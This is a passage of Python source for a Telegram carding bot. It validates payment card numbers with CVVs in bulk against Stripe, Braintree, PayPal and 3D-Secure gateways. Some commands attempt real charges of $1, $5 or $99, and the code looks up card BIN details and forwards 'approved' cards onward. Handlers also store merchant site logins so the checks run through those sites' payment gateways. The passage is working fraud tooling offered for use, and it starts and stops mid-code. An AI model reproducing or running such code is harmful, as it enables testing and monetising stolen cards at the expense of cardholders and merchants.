                                cm3 = types.InlineKeyboardButton(f"• 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 🔥 ➜ [ {charged} ] •", callback_data='x')
                                cm4 = types.InlineKeyboardButton(f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜ [ {live} ] •", callback_data='x')
                                cm5 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
                                cm6 = types.InlineKeyboardButton(f"• 𝙋𝙍𝙊𝙂𝙍𝙀𝙎𝙎 ➜ [ {checked}/{total} ] •", callback_data='x')
                                stop = types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
                                mes.add(cm3, cm4, cm5, cm6, stop)
                            else:
                                cm3 = types.InlineKeyboardButton(f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜ [ {live} ] •", callback_data='x')
                                cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
                                cm5 = types.InlineKeyboardButton(f"• 𝙋𝙍𝙊𝙂𝙍𝙀𝙎𝙎 ➜ [ {checked}/{total} ] •", callback_data='x')
                                stop = types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
                                mes.add(cm3, cm4, cm5, stop)
                            bot.edit_message_text(
                                chat_id=call.message.chat.id,
                                message_id=call.message.message_id,
                                text=f'𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 (6 Workers)...\n𝘽𝙤𝙩 𝘽𝙮 {DEV_NAME}',
                                reply_markup=mes
                            )
                        except:
                            pass
                            
                    except Exception as e:
                        print(f"Worker error: {e}")
                        continue

        except Exception as e:
            print(e)

        try:
            os.remove(file_path)
        except:
            pass

        stopuser[f'{id}']['status'] = 'start'
        if is_charge_gate:
            final_text = f'𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n🔥 Charged: {charged}\n✅ Approved: {live}\n❌ Declined: {dd}\n📊 Total: {total}\n𝗕𝗢𝗧 𝗕𝗬 ➜ {DEV_NAME}'
        else:
            final_text = f'𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n✅ Approved: {live}\n❌ Declined: {dd}\n📊 Total: {total}\n𝗕𝗢𝗧 𝗕𝗬 ➜ {DEV_NAME}'
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=final_text
        )

    threading.Thread(target=my_function).start()

#












@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def respond_to_vbv(message):
         if not is_user_allowed(message.from_user.id):
             bot.reply_to(message, f"⚠️ Access Denied\nContact {DEV_NAME}")
             return
         gate='𝐵𝑟𝑎𝑖𝑛𝑡𝑟𝑒𝑒 𝐴𝑢𝑡ℎ🔁'
         
         file_cards = get_cards_from_reply(message)
         if file_cards:
             mass_check_cards(message, file_cards, 'braintree', 'Braintree Auth')
             return
         
         try:
          text = message.reply_to_message.text
         except:
          text = message.text
         
         cards = extract_cards(text)
         if len(cards) > 1:
             mass_check_cards(message, cards, 'braintree', 'Braintree Auth')
             return
         
         ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...🔁").message_id)
         cc=str(reg(text))
         if cc == 'None':
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
        Please ensure you enter the card details in the correct format:
        Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
          return
         start_time = time.time()
         is_approved = False
         try:
          result = gatet(cc)
          if isinstance(result, dict):
              last = result.get('message', 'Unknown')
              is_approved = result.get('approved', False)
          else:
              last = str(result) if result else 'Error'
         except Exception as e:
          last='Error'
         data = {}
         try:
          data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6], timeout=10).json()
         except:
          pass
         brand = data.get('brand', 'Unknown')
         card_type = data.get('type', 'Unknown')
         country = data.get('country_name', 'Unknown')
         country_flag = data.get('country_flag', '')
         bank = data.get('bank', 'Unknown')
         end_time = time.time()
         execution_time = end_time - start_time
         msg = f"""
<b>✅ Approved (/chk)</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {card_type} - {brand}</code>
Bank → {bank}
Country → <code>{country} {country_flag}</code>
Time → {"{:.1f}".format(execution_time)} sec
Bot By → {DEV_NAME}
"""
             
         msgd = f"""
<b>❌ Declined (/chk)</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {card_type} - {brand}</code>
Bank → {bank}
Country → <code>{country} {country_flag}</code>
Time → {"{:.1f}".format(execution_time)} sec
Bot By → {DEV_NAME}
"""
             
         if is_approved:
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
          user_info = {'id': message.from_user.id, 'username': message.from_user.username, 'first_name': message.from_user.first_name}
          forward_approved_card(cc, gate, last, user_info)
         else:
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
          
#
#


@bot.message_handler(func=lambda message: (message.text.lower().startswith('.stc') or message.text.lower().startswith('/stc')) and not message.text.lower().startswith('.stc1') and not message.text.lower().startswith('/stc1') and not message.text.lower().startswith('.stc2') and not message.text.lower().startswith('/stc2'))
def respond_to_stc(message):
         if not is_user_allowed(message.from_user.id):
             bot.reply_to(message, f"⚠️ Access Denied\nContact {DEV_NAME}")
             return
         gate='𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 $1'
         
         file_cards = get_cards_from_reply(message)
         if file_cards:
             mass_check_cards(message, file_cards, 'stcharge', 'Stripe Charge $1')
             return
         
         try:
          text = message.reply_to_message.text
         except:
          text = message.text
         
         cards = extract_cards(text)
         if len(cards) > 1:
             mass_check_cards(message, cards, 'stcharge', 'Stripe Charge $1')
             return
         
         ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...🔁").message_id)
         cc=str(reg(text))
         if cc == 'None':
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
        Please ensure you enter the card details in the correct format:
        Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
          return
         start_time = time.time()
         try:
          result = stripe_charge(cc)
          last = result.get('message', 'Unknown')
          is_approved = result.get('approved', False)
         except Exception as e:
          last='Error'
          is_approved = False
         data = {}
         try:
          data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6], timeout=10).json()
         except:
          pass
         brand = data.get('brand', 'Unknown')
         card_type = data.get('type', 'Unknown')
         country = data.get('country_name', 'Unknown')
         country_flag = data.get('country_flag', '')
         bank = data.get('bank', 'Unknown')
         end_time = time.time()
         execution_time = end_time - start_time
         msg = f"""
<b>✅ Charged $1 (/stc)</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {card_type} - {brand}</code>
Bank → {bank}
Country → <code>{country} {country_flag}</code>
Time → {"{:.1f}".format(execution_time)} sec
Bot By → {DEV_NAME}
"""
             
         msgd = f"""
<b>❌ Declined (/stc)</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {card_type} - {brand}</code>
Bank → {bank}
Country → <code>{country} {country_flag}</code>
Time → {"{:.1f}".format(execution_time)} sec
Bot By → {DEV_NAME}
"""
             
         if is_approved:
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
          user_info = {'id': message.from_user.id, 'username': message.from_user.username, 'first_name': message.from_user.first_name}
          forward_approved_card(cc, gate, last, user_info)
         else:
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)


@bot.message_handler(func=lambda message: message.text.lower().startswith('.stc1') or message.text.lower().startswith('/stc1'))
def respond_to_stc1(message):
         if not is_user_allowed(message.from_user.id):
             bot.reply_to(message, f"⚠️ Access Denied\nContact {DEV_NAME}")
             return
         gate='𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 $5'
         
         file_cards = get_cards_from_reply(message)
         if file_cards:
             mass_check_cards(message, file_cards, 'stc1', 'Stripe Charge $5')
             return
         
         try:
          text = message.reply_to_message.text
         except:
          text = message.text
         
         cards = extract_cards(text)
         if len(cards) > 1:
             mass_check_cards(message, cards, 'stc1', 'Stripe Charge $5')
             return
         
         ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...🔁").message_id)
         cc = re.sub(r'^[./]stc1\s*', '', text, flags=re.IGNORECASE)
         cc=str(reg(cc))
         if cc == 'None':
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
        Please ensure you enter the card details in the correct format:
        Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
          return
         start_time = time.time()
         try:
          result = stc1_check(cc)
          last = result.get('message', 'Unknown')
          is_approved = result.get('approved', False)
         except Exception as e:
          last='Error'
          is_approved = False
         data = {}
         try:
          data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6], timeout=10).json()
         except:
          pass
         brand = data.get('brand', 'Unknown')
         card_type = data.get('type', 'Unknown')
         country = data.get('country_name', 'Unknown')
         country_flag = data.get('country_flag', '')
         bank = data.get('bank', 'Unknown')
         end_time = time.time()
         execution_time = end_time - start_time
         msg = f"""
<b>✅ Charged $5 (/stc1)</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {card_type} - {brand}</code>
Bank → {bank}
Country → <code>{country} {country_flag}</code>
Time → {"{:.1f}".format(execution_time)} sec
Bot By → {DEV_NAME}
"""
             
         msgd = f"""
<b>❌ Declined (/stc1)</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {card_type} - {brand}</code>
Bank → {bank}
Country → <code>{country} {country_flag}</code>
Time → {"{:.1f}".format(execution_time)} sec
Bot By → {DEV_NAME}
"""
             
         if is_approved:
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
          user_info = {'id': message.from_user.id, 'username': message.from_user.username, 'first_name': message.from_user.first_name}
          forward_approved_card(cc, gate, last, user_info)
         else:
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)


@bot.message_handler(func=lambda message: message.text.lower().startswith('.stc2') or message.text.lower().startswith('/stc2'))
def respond_to_stc2(message):
         if not is_user_allowed(message.from_user.id):
             bot.reply_to(message, f"⚠️ Access Denied\nContact {DEV_NAME}")
             return
         gate='𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 $99'
         
         file_cards = get_cards_from_reply(message)
         if file_cards:
             mass_check_cards(message, file_cards, 'stc2', 'Stripe Charge $99')
             return
         
         try:
          text = message.reply_to_message.text
         except:
          text = message.text
         
         cards = extract_cards(text)
         if len(cards) > 1:
             mass_check_cards(message, cards, 'stc2', 'Stripe Charge $99')
             return
         
         ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...🔁").message_id)
         cc = re.sub(r'^[./]stc2\s*', '', text, flags=re.IGNORECASE)
         cc=str(reg(cc))
         if cc == 'None':
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
        Please ensure you enter the card details in the correct format:
        Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
          return
         start_time = time.time()
         try:
          result = stc2_check(cc)
          last = result.get('message', 'Unknown')
          is_approved = result.get('approved', False)
         except Exception as e:
          last='Error'
          is_approved = False
         data = {}
         try:
          data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6], timeout=10).json()
         except:
          pass
         brand = data.get('brand', 'Unknown')
         card_type = data.get('type', 'Unknown')
         country = data.get('country_name', 'Unknown')
         country_flag = data.get('country_flag', '')
         bank = data.get('bank', 'Unknown')
         end_time = time.time()
         execution_time = end_time - start_time
         msg = f"""
<b>✅ Charged $99 (/stc2)</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {card_type} - {brand}</code>
Bank → {bank}
Country → <code>{country} {country_flag}</code>
Time → {"{:.1f}".format(execution_time)} sec
Bot By → {DEV_NAME}
"""
             
         msgd = f"""
<b>❌ Declined (/stc2)</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {card_type} - {brand}</code>
Bank → {bank}
Country → <code>{country} {country_flag}</code>
Time → {"{:.1f}".format(execution_time)} sec
Bot By → {DEV_NAME}
"""
             
         if is_approved:
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
          user_info = {'id': message.from_user.id, 'username': message.from_user.username, 'first_name': message.from_user.first_name}
          forward_approved_card(cc, gate, last, user_info)
         else:
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)


@bot.message_handler(func=lambda message: message.text.lower().startswith('.lc') or message.text.lower().startswith('/lc'))
def respond_to_lc(message):
         if not is_user_allowed(message.from_user.id):
             bot.reply_to(message, f"⚠️ Access Denied\nContact {DEV_NAME}")
             return
         gate='𝐋𝐢𝐨𝐧𝐬 𝟑𝐃 𝐕𝐁𝐕'
         
         file_cards = get_cards_from_reply(message)
         if file_cards:
             mass_check_cards(message, file_cards, 'lc', 'Lions 3D VBV')
             return
         
         try:
          text = message.reply_to_message.text
         except:
          text = message.text
         
         cards = extract_cards(text)
         if len(cards) > 1:
             mass_check_cards(message, cards, 'lc', 'Lions 3D VBV')
             return
         
         ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...🔁").message_id)
         cc = re.sub(r'^[./]lc\s*', '', text, flags=re.IGNORECASE)
         cc=str(reg(cc))
         if cc == 'None':
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
        Please ensure you enter the card details in the correct format:
        Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
          return
         start_time = time.time()
         try:
          result = lions_check(cc)
          last = result.get('message', 'Unknown')
          is_approved = result.get('approved', False)
         except Exception as e:
          last='Error'
          is_approved = False
         data = {}
         try:
          data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6], timeout=10).json()
         except:
          pass
         brand = data.get('brand', 'Unknown')
         card_type = data.get('type', 'Unknown')
         country = data.get('country_name', 'Unknown')
         country_flag = data.get('country_flag', '')
         bank = data.get('bank', 'Unknown')
         end_time = time.time()
         execution_time = end_time - start_time
         msg = f"""
<b>✅ Approved (/lc)</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {card_type} - {brand}</code>
Bank → {bank}
Country → <code>{country} {country_flag}</code>
Time → {"{:.1f}".format(execution_time)} sec
Bot By → {DEV_NAME}
"""
             
         msgd = f"""
<b>❌ Declined (/lc)</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {card_type} - {brand}</code>
Bank → {bank}
Country → <code>{country} {country_flag}</code>
Time → {"{:.1f}".format(execution_time)} sec
Bot By → {DEV_NAME}
"""
             
         if is_approved:
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
          user_info = {'id': message.from_user.id, 'username': message.from_user.username, 'first_name': message.from_user.first_name}
          forward_approved_card(cc, gate, last, user_info)
         else:
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)


@bot.message_handler(func=lambda message: message.text.lower().startswith('.pp') or message.text.lower().startswith('/pp'))
def respond_to_pp(message):
         if not is_user_allowed(message.from_user.id):
             bot.reply_to(message, f"⚠️ Access Denied\nContact {DEV_NAME}")
             return
         gate='𝐏𝐚𝐲𝐏𝐚𝐥 𝐂𝐡𝐚𝐫𝐠𝐞 $1'
         
         file_cards = get_cards_from_reply(message)
         if file_cards:
             mass_check_cards(message, file_cards, 'pp', 'PayPal $1')
             return
         
         try:
          text = message.reply_to_message.text
         except:
          text = message.text
         
         cards = extract_cards(text)
         if len(cards) > 1:
             mass_check_cards(message, cards, 'pp', 'PayPal $1')
             return
         
         ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...🔁").message_id)
         cc = re.sub(r'^[./]pp\s*', '', text, flags=re.IGNORECASE)
         cc=str(reg(cc))
         if cc == 'None':
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
        Please ensure you enter the card details in the correct format:
        Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
          return
         start_time = time.time()
         try:
          result = pp_check(cc)
          last = result.get('message', 'Unknown')
          is_approved = result.get('approved', False)
         except Exception as e:
          last='Error'
          is_approved = False
         data = {}
         try:
          data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6], timeout=10).json()
         except:
          pass
         brand = data.get('brand', 'Unknown')
         card_type = data.get('type', 'Unknown')
         country = data.get('country_name', 'Unknown')
         country_flag = data.get('country_flag', '')
         bank = data.get('bank', 'Unknown')
         end_time = time.time()
         execution_time = end_time - start_time
         msg = f"""
<b>✅ Charged $1 (/pp)</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {card_type} - {brand}</code>
Bank → {bank}
Country → <code>{country} {country_flag}</code>
Time → {"{:.1f}".format(execution_time)} sec
Bot By → {DEV_NAME}
"""
             
         msgd = f"""
<b>❌ Declined (/pp)</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {card_type} - {brand}</code>
Bank → {bank}
Country → <code>{country} {country_flag}</code>
Time → {"{:.1f}".format(execution_time)} sec
Bot By → {DEV_NAME}
"""
             
         if is_approved:
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
          user_info = {'id': message.from_user.id, 'username': message.from_user.username, 'first_name': message.from_user.first_name}
          forward_approved_card(cc, gate, last, user_info)
         else:
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)


@bot.message_handler(commands=['setsite', 'addsite'])
def set_site_handler(message):
    user_id = message.from_user.id
    if not is_user_allowed(user_id):
        bot.reply_to(message, f"⚠️ Access Denied\nContact {DEV_NAME}")
        return
    try:
        parts = message.text.split(maxsplit=3)
        if len(parts) != 4:
            bot.reply_to(message, """<b>Usage:</b>
<code>/addsite https://example.com email password</code>

<b>Example:</b>
<code>/addsite https://catechdepot.com user@gmail.com mypass123</code>

Note: Site must use Stripe payment gateway""", parse_mode="HTML")
            return
        
        site = parts[1].strip()
        email = parts[2].strip()
        password = parts[3].strip()
        
        if not site.startswith('http'):
            site = 'https://' + site
        
        ko = bot.reply_to(message, "🔄 Verifying login credentials...").message_id
        
        verify_result = verify_stripe_login(site, email, password)
        
        if not verify_result['success']:
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"""<b>❌ Verification Failed</b>

{verify_result['message']}

Bot By → {DEV_NAME}""", parse_mode="HTML")
            return
        
        slot = save_site_config(user_id, site, email, password)
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"""<b>✅ Stripe Site #{slot} Saved!</b>

<b>Site:</b> <code>{site}</code>
<b>Email:</b> <code>{email}</code>
<b>Password:</b> <code>{'*' * len(password)}</code>

Use <code>/ast{slot}</code> to check cards with this site.
Bot By → {DEV_NAME}""", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


@bot.message_handler(commands=['mysite', 'mysites'])
def my_site_handler(message):
    user_id = message.from_user.id
    if not is_user_allowed(user_id):
        bot.reply_to(message, f"⚠️ Access Denied\nContact {DEV_NAME}")
        return
    
    sites = list_sites(user_id)
    
    if not sites:
        bot.reply_to(message, f"""<b>❌ No Stripe Sites Configured</b>

Use <code>/addsite</code> to add your site.
Bot By → {DEV_NAME}""", parse_mode="HTML")
        return
    
    site_list = ""
    for s in sites:
        site_list += f"""
<b>#{s['slot']}</b> - <code>{s['site']}</code>
   Email: <code>{s['email']}</code>
   Use: <code>/ast{s['slot']}</code>
"""
    
    bot.reply_to(message, f"""<b>📋 Your Stripe Sites</b>
{site_list}
Bot By → {DEV_NAME}""", parse_mode="HTML")


@bot.message_handler(func=lambda message: message.text and re.match(r'^[./]delsite\s*(\d+)?$', message.text, re.IGNORECASE))
def del_site_handler(message):
    user_id = message.from_user.id
    if not is_user_allowed(user_id):
        bot.reply_to(message, f"⚠️ Access Denied\nContact {DEV_NAME}")
        return
    
    match = re.match(r'^[./]delsite\s*(\d+)?$', message.text, re.IGNORECASE)
    slot = match.group(1) if match else None
    
    if not slot:
        bot.reply_to(message, """<b>Usage:</b>
<code>/delsite 1</code> - Delete site #1
<code>/delsite 2</code> - Delete site #2""", parse_mode="HTML")
        return
    
    if delete_site_config(user_id, slot):
        bot.reply_to(message, f"""<b>✅ Stripe Site #{slot} Deleted!</b>

Bot By → {DEV_NAME}""", parse_mode="HTML")
    else:
        bot.reply_to(message, f"""<b>❌ Site #{slot} Not Found</b>

Bot By → {DEV_NAME}""", parse_mode="HTML")


@bot.message_handler(commands=['setbtsite', 'addbtsite'])
def set_btsite_handler(message):
    user_id = message.from_user.id
    if not is_user_allowed(user_id):
        bot.reply_to(message, f"⚠️ Access Denied\nContact {DEV_NAME}")
        return
    try:
        parts = message.text.split(maxsplit=3)
        if len(parts) != 4:
            bot.reply_to(message, """<b>Usage:</b>
<code>/addbtsite https://example.com email password</code>

<b>Example:</b>
<code>/addbtsite https://mybtsite.com user@gmail.com mypass123</code>

Note: Site must use Braintree payment gateway""", parse_mode="HTML")
            return
        
        site = parts[1].strip()
        email = parts[2].strip()
        password = parts[3].strip()
        
        if not site.startswith('http'):
            site = 'https://' + site
        
        ko = bot.reply_to(message, "🔄 Verifying login credentials...").message_id
        
        verify_result = verify_bt_login(site, email, password)
        
        if not verify_result['success']:
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"""<b>❌ Verification Failed</b>

{verify_result['message']}

Bot By → {DEV_NAME}""", parse_mode="HTML")
            return
        
        slot = save_bt_site_config(user_id, site, email, password)
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"""<b>✅ Braintree Site #{slot} Saved!</b>

<b>Site:</b> <code>{site}</code>
<b>Email:</b> <code>{email}</code>
<b>Password:</b> <code>{'*' * len(password)}</code>

Use <code>/abt{slot}</code> to check cards with this site.
Bot By → {DEV_NAME}""", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


@bot.message_handler(commands=['mybtsite', 'mybtsites'])
def my_btsite_handler(message):
    user_id = message.from_user.id
    if not is_user_allowed(user_id):
        bot.reply_to(message, f"⚠️ Access Denied\nContact {DEV_NAME}")
        return
    
    sites = list_bt_sites(user_id)
    
    if not sites:
        bot.reply_to(message, f"""<b>❌ No Braintree Sites Configured</b>

Use <code>/addbtsite</code> to add your site.
Bot By → {DEV_NAME}""", parse_mode="HTML")
        return
    
    site_list = ""
    for s in sites:
        site_list += f"""
<b>#{s['slot']}</b> - <code>{s['site']}</code>
   Email: <code>{s['email']}</code>
   Use: <code>/abt{s['slot']}</code>
"""
    
    bot.reply_to(message, f"""<b>📋 Your Braintree Sites</b>
{site_list}
Bot By → {DEV_NAME}""", parse_mode="HTML")


@bot.message_handler(func=lambda message: message.text and re.match(r'^[./]delbtsite\s*(\d+)?$', message.text, re.IGNORECASE))
def del_btsite_handler(message):
    user_id = message.from_user.id
    if not is_user_allowed(user_id):
        bot.reply_to(message, f"⚠️ Access Denied\nContact {DEV_NAME}")
        return
    
    match = re.match(r'^[./]delbtsite\s*(\d+)?$', message.text, re.IGNORECASE)
    slot = match.group(1) if match else None
    
    if not slot:
        bot.reply_to(message, """<b>Usage:</b>
<code>/delbtsite 1</code> - Delete site #1
<code>/delbtsite 2</code> - Delete site #2""", parse_mode="HTML")
        return
    
    if delete_bt_site_config(user_id, slot):
        bot.reply_to(message, f"""<b>✅ Braintree Site #{slot} Deleted!</b>

Bot By → {DEV_NAME}""", parse_mode="HTML")
    else:
        bot.reply_to(message, f"""<b>❌ Site #{slot} Not Found</b>

Bot By → {DEV_NAME}""", parse_mode="HTML")


@bot.message_handler(func=lambda message: message.text and re.match(r'^[./]abt\d*(\s|$)', message.text, re.IGNORECASE))
def respond_to_abt(message):
         if not is_user_allowed(message.from_user.id):
             bot.reply_to(message, f"⚠️ Access Denied\nContact {DEV_NAME}")
             return
         user_id = str(message.from_user.id)
         
         slot_match = re.match(r'^[./]abt(\d*)', message.text, re.IGNORECASE)
         slot = slot_match.group(1) if slot_match and slot_match.group(1) else '1'
         
         config = load_bt_site_config(user_id, slot)
         if not config:
             bot.reply_to(message, f"""<b>❌ No Braintree Site #{slot} Configured</b>

Use <code>/addbtsite</code> to add your site first.
Use <code>/mybtsite</code> to see your sites.
Bot By → {DEV_NAME}""", parse_mode="HTML")
             return
         
         file_cards = get_cards_from_reply(message)
         if file_cards:
             mass_check_cards(message, file_cards, f'abt{slot}', f"Auto Braintree #{slot} ({config['site'][:20]})")
             return
         
         try:
          text = message.reply_to_message.text
         except:
          text = message.text
         
         cards = extract_cards(text)
         if len(cards) > 1:
             mass_check_cards(message, cards, f'abt{slot}', f"Auto Braintree #{slot} ({config['site'][:20]})")
             return
         
         gate=f"𝐀𝐮𝐭𝐨 𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞 #{slot} ({config['site'][:25]})"
         ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...🔁").message_id)
         cc = re.sub(r'^[./]abt\d*\s*', '', text, flags=re.IGNORECASE)
         cc=str(reg(cc))
         if cc == 'None':
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
        Please ensure you enter the card details in the correct format:
        Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
          return
         start_time = time.time()
         try:
          result = autobt_check(cc, user_id, slot)
          last = result.get('message', 'Unknown')
          is_approved = result.get('approved', False)
         except Exception as e:
          last='Error'
          is_approved = False
         data = {}
         try:
          data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6], timeout=10).json()
         except:
          pass
         brand = data.get('brand', 'Unknown')
         card_type = data.get('type', 'Unknown')
         country = data.get('country_name', 'Unknown')
         country_flag = data.get('country_flag', '')
         bank = data.get('bank', 'Unknown')
         end_time = time.time()
         execution_time = end_time - start_time
         msg = f"""
<b>✅ Approved (/abt{slot})</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {card_type} - {brand}</code>
Bank → {bank}
Country → <code>{country} {country_flag}</code>
Time → {"{:.1f}".format(execution_time)} sec
Bot By → {DEV_NAME}
"""
             
         msgd = f"""
<b>❌ Declined (/abt{slot})</b>

<code>CC → {cc}</code>
Gate → {gate}
Response → {last}

BIN → <code>{cc[:6]} - {card_type} - {brand}</code>
Bank → {bank}
Country → <code>{country} {country_flag}</code>
Time → {"{:.1f}".format(execution_time)} sec
Bot By → {DEV_NAME}
"""
             
         if is_approved:
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
          user_info = {'id': message.from_user.id, 'username': message.from_user.username, 'first_name': message.from_user.first_name}
          forward_approved_card(cc, gate, last, user_info)
         else:
          bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)


@bot.message_handler(func=lambda message: message.text and re.match(r'^[./]ast\d*(\s|$)', message.text, re.IGNORECASE))
def respond_to_ast(message):
         if not is_user_allowed(message.from_user.id):
             bot.reply_to(message, f"⚠️ Access Denied\nContact {DEV_NAME}")
             return
         user_id = str(message.from_user.id)
         
         slot_match = re.match(r'^[./]ast(\d*)', message.text, re.IGNORECASE)
         slot = slot_match.group(1) if slot_match and slot_match.group(1) else '1'
         
         config = load_site_config(user_id, slot)
         if not config:
             bot.reply_to(message, f"""<b>❌ No Stripe Site #{slot} Configured</b>

Use <code>/addsite</code> to add your site first.
Use <code>/mysite</code> to see your sites.
Bot By → {DEV_NAME}""", parse_mode="HTML")
             return
         
         file_cards = get_cards_from_reply(message)
         if file_cards:
             mass_check_cards(message, file_cards, f'ast{slot}', f"Auto Stripe #{slot} ({config['site'][:20]})")
             return
         
         try:
          text = message.reply_to_message.text
         except:
          text = message.text
         
         cards = extract_cards(text)
         if len(cards) > 1:
             mass_check_cards(message, cards, f'ast{slot}', f"Auto Stripe #{slot} ({config['site'][:20]})")
             return
         
         gate=f"𝐀𝐮𝐭𝐨 𝐒𝐭𝐫𝐢𝐩𝐞 #{slot} ({config['site'][:25]})"
         ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...🔁").message_id)
         cc = re.sub(r'^[./]ast\d*\s*', '', text, flags=re.IGNORECASE)
         cc=str(reg(cc))
